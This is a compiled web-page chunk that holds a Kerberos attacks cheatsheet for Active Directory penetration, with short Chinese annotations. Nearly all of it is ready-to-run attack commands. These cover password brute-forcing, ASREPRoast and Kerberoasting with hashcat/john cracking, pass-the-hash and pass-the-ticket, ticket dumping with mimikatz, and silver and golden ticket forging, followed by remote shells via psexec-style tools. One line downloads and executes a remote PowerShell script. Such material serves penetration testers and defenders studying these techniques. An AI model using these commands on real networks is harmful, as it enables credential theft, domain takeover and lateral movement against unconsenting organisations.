import{_ as s,c as a,o as t,ag as n}from"./chunks/framework.Co20b0ok.js";const u=JSON.parse('{"title":"kerberos_attacks_cheatsheet","description":"","frontmatter":{},"headers":[],"relativePath":"intranet-security/domain-penetration/kerberos_attacks_cheatsheet.md","filePath":"intranet-security/domain-penetration/kerberos_attacks_cheatsheet.md"}'),i={name:"intranet-security/domain-penetration/kerberos_attacks_cheatsheet.md"};function p(l,e,o,r,c,h){return t(),a("div",null,e[0]||(e[0]=[n(`<h1 id="kerberos-attacks-cheatsheet" tabindex="-1">kerberos_attacks_cheatsheet <a class="header-anchor" href="#kerberos-attacks-cheatsheet" aria-label="Permalink to &quot;kerberos_attacks_cheatsheet&quot;">​</a></h1><blockquote><p>来自于： <a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a" target="_blank" rel="noreferrer">https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a</a></p></blockquote><h1 id="kerberos-cheatsheet" tabindex="-1">Kerberos cheatsheet <a class="header-anchor" href="#kerberos-cheatsheet" aria-label="Permalink to &quot;Kerberos cheatsheet&quot;">​</a></h1><h2 id="bruteforcing-爆破攻击" tabindex="-1">Bruteforcing 爆破攻击 <a class="header-anchor" href="#bruteforcing-爆破攻击" aria-label="Permalink to &quot;Bruteforcing 爆破攻击&quot;">​</a></h2><p>With <a href="https://github.com/TarlogicSecurity/kerbrute" target="_blank" rel="noreferrer">kerbrute.py</a>:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>python kerbrute.py -domain &lt;domain_name&gt; -users &lt;users_file&gt; -passwords &lt;passwords_file&gt; -outputfile &lt;output_file&gt;</span></span></code></pre></div><p>With <a href="https://github.com/Zer1t0/Rubeus" target="_blank" rel="noreferrer">Rubeus</a> version with brute module:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span># with a list of users</span></span>
<span class="line"><span>.\\Rubeus.exe brute /users:&lt;users_file&gt; /passwords:&lt;passwords_file&gt; /domain:&lt;domain_name&gt; /outfile:&lt;output_file&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># check passwords for all users in current domain</span></span>
<span class="line"><span>.\\Rubeus.exe brute /passwords:&lt;passwords_file&gt; /outfile:&lt;output_file&gt;</span></span></code></pre></div><h2 id="asreproast" tabindex="-1">ASREPRoast <a class="header-anchor" href="#asreproast" aria-label="Permalink to &quot;ASREPRoast&quot;">​</a></h2><p>With <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noreferrer">Impacket</a> example GetNPUsers.py:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span># check ASREPRoast for all domain users (credentials required)</span></span>
<span class="line"><span>python GetNPUsers.py &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; -request -format &lt;AS_REP_responses_format [hashcat | john]&gt; -outputfile &lt;output_AS_REP_responses_file&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># check ASREPRoast for a list of users (no credentials required)</span></span>
<span class="line"><span>python GetNPUsers.py &lt;domain_name&gt;/ -usersfile &lt;users_file&gt; -format &lt;AS_REP_responses_format [hashcat | john]&gt; -outputfile &lt;output_AS_REP_responses_file&gt;</span></span></code></pre></div><p>With <a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noreferrer">Rubeus</a>:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span># check ASREPRoast for all users in current domain</span></span>
<span class="line"><span>.\\Rubeus.exe asreproast  /format:&lt;AS_REP_responses_format [hashcat | john]&gt; /outfile:&lt;output_hashes_file&gt;</span></span></code></pre></div><p>Cracking with dictionary of passwords:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>hashcat -m 18200 -a 0 &lt;AS_REP_responses_file&gt; &lt;passwords_file&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>john --wordlist=&lt;passwords_file&gt; &lt;AS_REP_responses_file&gt;</span></span></code></pre></div><h2 id="kerberoasting" tabindex="-1">Kerberoasting <a class="header-anchor" href="#kerberoasting" aria-label="Permalink to &quot;Kerberoasting&quot;">​</a></h2><p>With <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noreferrer">Impacket</a> example GetUserSPNs.py:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>python GetUserSPNs.py &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; -outputfile &lt;output_TGSs_file&gt;</span></span></code></pre></div><p>With <a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noreferrer">Rubeus</a>:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>.\\Rubeus.exe kerberoast /outfile:&lt;output_TGSs_file&gt;</span></span></code></pre></div><p>With <strong>Powershell</strong>:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>iex (new-object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1&quot;)</span></span>
<span class="line"><span>Invoke-Kerberoast -OutputFormat &lt;TGSs_format [hashcat | john]&gt; | % { $_.Hash } | Out-File -Encoding ASCII &lt;output_TGSs_file&gt;</span></span></code></pre></div><p>Cracking with dictionary of passwords:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>hashcat -m 13100 --force &lt;TGSs_file&gt; &lt;passwords_file&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>john --format=krb5tgs --wordlist=&lt;passwords_file&gt; &lt;AS_REP_responses_file&gt;</span></span></code></pre></div><h2 id="overpass-the-hash-pass-the-key-ptk" tabindex="-1">Overpass The Hash/Pass The Key (PTK) <a class="header-anchor" href="#overpass-the-hash-pass-the-key-ptk" aria-label="Permalink to &quot;Overpass The Hash/Pass The Key (PTK)&quot;">​</a></h2><p>By using <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noreferrer">Impacket</a> examples:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span># Request the TGT with hash</span></span>
<span class="line"><span>python getTGT.py &lt;domain_name&gt;/&lt;user_name&gt; -hashes [lm_hash]:&lt;ntlm_hash&gt;</span></span>
<span class="line"><span># Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)</span></span>
<span class="line"><span>python getTGT.py &lt;domain_name&gt;/&lt;user_name&gt; -aesKey &lt;aes_key&gt;</span></span>
<span class="line"><span># Request the TGT with password</span></span>
<span class="line"><span>python getTGT.py &lt;domain_name&gt;/&lt;user_name&gt;:[password]</span></span>
<span class="line"><span># If not provided, password is asked</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Set the TGT for impacket use</span></span>
<span class="line"><span>export KRB5CCNAME=&lt;TGT_ccache_file&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Execute remote commands with any of the following by using the TGT</span></span>
<span class="line"><span>python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass</span></span>
<span class="line"><span>python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass</span></span>
<span class="line"><span>python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass</span></span></code></pre></div><p>With <a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noreferrer">Rubeus</a> and <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank" rel="noreferrer">PsExec</a>:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span># Ask and inject the ticket</span></span>
<span class="line"><span>.\\Rubeus.exe asktgt /domain:&lt;domain_name&gt; /user:&lt;user_name&gt; /rc4:&lt;ntlm_hash&gt; /ptt</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Execute a cmd in the remote machine</span></span>
<span class="line"><span>.\\PsExec.exe -accepteula \\\\&lt;remote_hostname&gt; cmd</span></span></code></pre></div><h2 id="pass-the-ticket-ptt" tabindex="-1">Pass The Ticket (PTT) <a class="header-anchor" href="#pass-the-ticket-ptt" aria-label="Permalink to &quot;Pass The Ticket (PTT)&quot;">​</a></h2><h3 id="harvest-tickets-from-linux-从linux中获得票据" tabindex="-1">Harvest tickets from Linux - 从Linux中获得票据 <a class="header-anchor" href="#harvest-tickets-from-linux-从linux中获得票据" aria-label="Permalink to &quot;Harvest tickets from Linux - 从Linux中获得票据&quot;">​</a></h3><p>Check type and location of tickets: - 检查票证类型和位置：</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>grep default_ccache_name /etc/krb5.conf</span></span></code></pre></div><p>如果没有返回，默认为 <code>FILE:/tmp/krb5cc_%{uid}</code></p><p>如果有文件票，您可以复制粘贴（如果您有权限）来使用它们。</p><p>In case of being <em>KEYRING</em> tickets, you can use <a href="https://github.com/TarlogicSecurity/tickey" target="_blank" rel="noreferrer">tickey</a> to get them:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span># To dump current user tickets, if root, try to dump them all by injecting in other user processes</span></span>
<span class="line"><span># to inject, copy tickey in a reachable folder by all users</span></span>
<span class="line"><span>cp tickey /tmp/tickey</span></span>
<span class="line"><span>/tmp/tickey -i</span></span></code></pre></div><h3 id="harvest-tickets-from-windows-从windows中获得票据" tabindex="-1">Harvest tickets from Windows - 从Windows中获得票据 <a class="header-anchor" href="#harvest-tickets-from-windows-从windows中获得票据" aria-label="Permalink to &quot;Harvest tickets from Windows - 从Windows中获得票据&quot;">​</a></h3><p>With <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noreferrer">Mimikatz</a>:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>mimikatz # sekurlsa::tickets /export</span></span></code></pre></div><p>With <a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noreferrer">Rubeus</a> in Powershell:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>.\\Rubeus dump</span></span>
<span class="line"><span></span></span>
<span class="line"><span># After dump with Rubeus tickets in base64, to write the in a file</span></span>
<span class="line"><span>[IO.File]::WriteAllBytes(&quot;ticket.kirbi&quot;, [Convert]::FromBase64String(&quot;&lt;bas64_ticket&gt;&quot;))</span></span></code></pre></div><p>To convert tickets between Linux/Windows format with <a href="https://github.com/Zer1t0/ticket_converter" target="_blank" rel="noreferrer">ticket_converter.py</a>: - 将票据再<code>Linux</code>和<code>Windows</code>中转换</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>python ticket_converter.py ticket.kirbi ticket.ccache</span></span>
<span class="line"><span>python ticket_converter.py ticket.ccache ticket.kirbi</span></span></code></pre></div><h3 id="using-ticket-in-linux" tabindex="-1">Using ticket in Linux: <a class="header-anchor" href="#using-ticket-in-linux" aria-label="Permalink to &quot;Using ticket in Linux:&quot;">​</a></h3><p>With <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noreferrer">Impacket</a> examples:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span># Set the ticket for impacket use</span></span>
<span class="line"><span>export KRB5CCNAME=&lt;TGT_ccache_file_path&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Execute remote commands with any of the following by using the TGT</span></span>
<span class="line"><span>python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass</span></span>
<span class="line"><span>python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass</span></span>
<span class="line"><span>python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass</span></span></code></pre></div><h3 id="using-ticket-in-windows" tabindex="-1">Using ticket in Windows <a class="header-anchor" href="#using-ticket-in-windows" aria-label="Permalink to &quot;Using ticket in Windows&quot;">​</a></h3><p>Inject ticket with <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noreferrer">Mimikatz</a>:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;</span></span></code></pre></div><p>Inject ticket with <a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noreferrer">Rubeus</a>:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>.\\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;</span></span></code></pre></div><p>Execute a cmd in the remote machine with <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank" rel="noreferrer">PsExec</a>:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>.\\PsExec.exe -accepteula \\\\&lt;remote_hostname&gt; cmd</span></span></code></pre></div><h2 id="silver-ticket" tabindex="-1">Silver ticket <a class="header-anchor" href="#silver-ticket" aria-label="Permalink to &quot;Silver ticket&quot;">​</a></h2><p>With <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noreferrer">Impacket</a> examples:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span># To generate the TGS with NTLM</span></span>
<span class="line"><span>python ticketer.py -nthash &lt;ntlm_hash&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt; -spn &lt;service_spn&gt;  &lt;user_name&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># To generate the TGS with AES key</span></span>
<span class="line"><span>python ticketer.py -aesKey &lt;aes_key&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt; -spn &lt;service_spn&gt;  &lt;user_name&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Set the ticket for impacket use</span></span>
<span class="line"><span>export KRB5CCNAME=&lt;TGS_ccache_file&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Execute remote commands with any of the following by using the TGT</span></span>
<span class="line"><span>python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass</span></span>
<span class="line"><span>python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass</span></span>
<span class="line"><span>python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass</span></span></code></pre></div><p>With <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noreferrer">Mimikatz</a>:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span># To generate the TGS with NTLM</span></span>
<span class="line"><span>mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /rc4:&lt;ntlm_hash&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># To generate the TGS with AES 128 key</span></span>
<span class="line"><span>mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)</span></span>
<span class="line"><span>mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Inject TGS with Mimikatz</span></span>
<span class="line"><span>mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;</span></span></code></pre></div><p>Inject ticket with <a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noreferrer">Rubeus</a>:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>.\\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;</span></span></code></pre></div><p>Execute a cmd in the remote machine with <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank" rel="noreferrer">PsExec</a>:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>.\\PsExec.exe -accepteula \\\\&lt;remote_hostname&gt; cmd</span></span></code></pre></div><h2 id="golden-ticket" tabindex="-1">Golden ticket <a class="header-anchor" href="#golden-ticket" aria-label="Permalink to &quot;Golden ticket&quot;">​</a></h2><p>With <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noreferrer">Impacket</a> examples:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span># To generate the TGT with NTLM</span></span>
<span class="line"><span>python ticketer.py -nthash &lt;krbtgt_ntlm_hash&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt;  &lt;user_name&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># To generate the TGT with AES key</span></span>
<span class="line"><span>python ticketer.py -aesKey &lt;aes_key&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt;  &lt;user_name&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Set the ticket for impacket use</span></span>
<span class="line"><span>export KRB5CCNAME=&lt;TGS_ccache_file&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Execute remote commands with any of the following by using the TGT</span></span>
<span class="line"><span>python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass</span></span>
<span class="line"><span>python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass</span></span>
<span class="line"><span>python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass</span></span></code></pre></div><p>With <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noreferrer">Mimikatz</a>:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span># To generate the TGT with NTLM</span></span>
<span class="line"><span>mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /rc4:&lt;krbtgt_ntlm_hash&gt; /user:&lt;user_name&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># To generate the TGT with AES 128 key</span></span>
<span class="line"><span>mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)</span></span>
<span class="line"><span>mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Inject TGT with Mimikatz</span></span>
<span class="line"><span>mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;</span></span></code></pre></div><p>Inject ticket with <a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noreferrer">Rubeus</a>:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>.\\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;</span></span></code></pre></div><p>Execute a cmd in the remote machine with <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank" rel="noreferrer">PsExec</a>:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>.\\PsExec.exe -accepteula \\\\&lt;remote_hostname&gt; cmd</span></span></code></pre></div><h2 id="misc" tabindex="-1">Misc <a class="header-anchor" href="#misc" aria-label="Permalink to &quot;Misc&quot;">​</a></h2><p>To get NTLM from password:</p><div class="language-python vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">python </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">c </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;import hashlib,binascii; print binascii.hexlify(hashlib.new(&quot;md4&quot;, &quot;&lt;password&gt;&quot;.encode(&quot;utf-16le&quot;)).digest())&#39;</span></span></code></pre></div><h2 id="tools" tabindex="-1">Tools <a class="header-anchor" href="#tools" aria-label="Permalink to &quot;Tools&quot;">​</a></h2><ul><li><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noreferrer">Impacket</a></li><li><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noreferrer">Mimikatz</a></li><li><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noreferrer">Rubeus</a></li><li><a href="https://github.com/Zer1t0/Rubeus" target="_blank" rel="noreferrer">Rubeus</a> with brute module</li><li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank" rel="noreferrer">PsExec</a></li><li><a href="https://github.com/TarlogicSecurity/kerbrute" target="_blank" rel="noreferrer">kerbrute.py</a></li><li><a href="https://github.com/TarlogicSecurity/tickey" target="_blank" rel="noreferrer">tickey</a></li><li><a href="https://github.com/Zer1t0/ticket_converter" target="_blank" rel="noreferrer">ticket_converter.py</a></li></ul>`,77)]))}const g=s(i,[["render",p]]);export{u as __pageData,g as default};
